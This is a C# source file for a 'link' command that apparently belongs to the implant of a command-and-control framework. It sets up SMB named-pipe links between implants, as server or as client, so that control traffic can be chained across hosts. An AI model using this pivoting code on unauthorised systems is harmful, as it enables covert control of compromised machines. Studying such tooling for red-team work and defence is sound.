using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;

using Engineer.Models;

namespace Engineer.Commands
{
    internal class Link : EngineerCommand
    {
        public override string Name => "link";
        public static string Output { get; set;}
        public EngSMBComm ParentSMBcommModule { get; set; }
        public bool ParentIsServer { get; set; }

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/pipe", out var namedPipe);
            task.Arguments.TryGetValue("/ip", out var serverip);


            namedPipe = namedPipe.TrimStart(' ');
            if (serverip != null)
            {
                serverip = serverip.TrimStart(' ');
            }

            if (task.Arguments.ContainsKey("/ip"))
            {
                ParentIsServer = false; // if we have an ip argument we are a client connection somewhere
            }
            else
            {
                ParentIsServer = true;
            }

            if (ParentIsServer)
            {
               // Console.WriteLine("starting parent as server");
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"starting parent as server", task, EngTaskStatus.Running,TaskResponseType.String);
                ParentSMBcommModule = new EngSMBComm(namedPipe, true); // parent as server
                Task.Run(async () => await ParentSMBcommModule.Start());
            }
            else if (!ParentIsServer)
            {
                //Console.WriteLine("starting parent as client");
                //Console.WriteLine($"trying to connect to named pipe {namedPipe} at {serverip}");
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"starting parent as client \n trying to connect to named pipe {namedPipe} at {serverip}", task, EngTaskStatus.Running,TaskResponseType.String);
                ParentSMBcommModule = new EngSMBComm(namedPipe, serverip, true); // parent as client
                Task.Run(async () => await ParentSMBcommModule.Start());
            }
            while (Output == null)
            {
                Thread.Sleep(20);
            }
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(Output,task,EngTaskStatus.Complete,TaskResponseType.String);
        }
    }
}
